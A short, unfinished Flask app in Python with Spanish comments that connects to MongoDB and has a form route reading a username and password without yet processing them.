from flask import Flask, request, render_template, jsonify
#import instaloader
import pymongo
from pymongo import MongoClient
import os

app = Flask(__name__)

mongo_uri = os.getenv("MONGODB_URI")

try:
    client = MongoClient(mongo_uri)
except Exception as e:
    print(f"Error al conectar a MongoDB: {e}")

# Ruta para la página principal
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para el procesamiento del formulario
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

if __name__ == '__main__':
    app.run(port=5001)
